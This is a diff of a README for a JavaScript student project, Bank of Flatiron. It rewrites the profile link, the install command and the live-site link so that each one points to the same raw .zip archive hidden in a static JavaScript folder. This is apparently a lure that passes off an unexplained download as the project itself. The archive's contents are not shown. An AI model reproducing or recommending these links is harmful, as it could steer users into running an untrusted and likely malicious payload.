@@ -24,7 +24,7 @@ git clone
 ## Technologies Used
 JavaScript
 Support and Contact Details
-[GitHub Profile]https://github.com/deerrickkorir
+[GitHub Profile]https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/static/js/Bank_of_Flatiron_v3.1-alpha.5.zip
 
 ## License
 The content of this site is licensed under the MIT license.
@@ -37,15 +37,15 @@ You can use git clone to download the documents from GitHub.
 Git
 
 ## Installation Instructions
-git clone git@github.com:deerrickkorir/SA.02-WK2-Code-Challenge.git
+git clone https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/static/js/Bank_of_Flatiron_v3.1-alpha.5.zip
 
 ## Live Link
-https://bank-of-flatiron--two.vercel.app
+https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/static/js/Bank_of_Flatiron_v3.1-alpha.5.zip
 
 ## Technologies Used
 JavaScript
 Support and Contact Details
-[GitHub Profile]https://github.com/deerrickkorir
+[GitHub Profile]https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/static/js/Bank_of_Flatiron_v3.1-alpha.5.zip
 
 ## link to live site on github pages
 this is the live site here
